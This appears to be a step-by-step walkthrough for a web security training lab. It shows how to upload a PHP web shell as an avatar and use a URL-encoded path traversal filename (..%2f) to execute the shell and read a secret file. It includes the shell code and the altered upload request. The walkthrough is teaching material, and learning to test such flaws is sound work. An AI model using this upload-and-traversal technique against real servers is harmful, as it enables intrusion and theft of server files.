## ✅ Lab: Web Shell Upload via Path Traversal 

### 🧠 Lab Goal:

Exploit path traversal in image upload to execute a PHP web shell and read:
`/home/carlos/secret`

---

### 🪜 Step-by-Step Guide:

#### 🥇 Step 1: Create Web Shell File

Locally create a PHP file named `exploit.php` with the following content:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

#### 🥈 Step 2: Login to the Lab

Use the given credentials to log in:

* **Username:** `wiener`
* **Password:** `peter`

---

#### 🥉 Step 3: Upload exploit.php as Avatar

* Go to **My Account** section
* Upload `exploit.php` file as your avatar

---

#### 🏃‍♂️ Step 4: Check if Shell Executes

* Right-click on your avatar image → **Open image in new tab**
* If the PHP code is shown as plain text (not executed), it means file execution is blocked in `/files/avatars/` folder

---

#### 🔁 Step 5: Intercept Upload Request

* Open Burp Suite → Proxy → HTTP History
* Find this request: `POST /my-account/avatar`
* Send it to **Burp Repeater**

---

#### ✏️ Step 6: Modify Filename with Path Traversal

In Burp Repeater:

Replace this line:

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
```

With this:

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

> `%2f` is URL encoded forward slash `/`

---

#### 📥 Step 7: Confirm File Upload Path

* Send the request
* Confirm the response contains:

```http
The file avatars/../exploit.php has been uploaded.
```

This means the file was uploaded outside the `/avatars` folder and possibly landed in `/files/`

---

#### 🔓 Step 8: Execute the Web Shell

In browser, go to:

```url
https://<LAB-ID>.web-security-academy.net/files/exploit.php
```

This should execute your PHP code and return Carlos’s secret.

---

#### ✅ Step 9: Submit the Secret

* Copy the output from `/files/exploit.php`
* Paste it into the **"Submit solution"** box on the lab page
* Click Submit

🎉 **Lab solved!**

---

### 📌 Summary of Tricks Used:

| Trick                  | Description                                            |
| ---------------------- | ------------------------------------------------------ |
| Path Traversal         | Used `..%2f` to bypass directory restrictions          |
| PHP Upload             | Injected simple web shell                              |
| Bypass Execution Block | Moved file to parent folder where execution is allowed |
| Manual Path Fix        | Guessed `/files/exploit.php` based on traversal logic  |

---

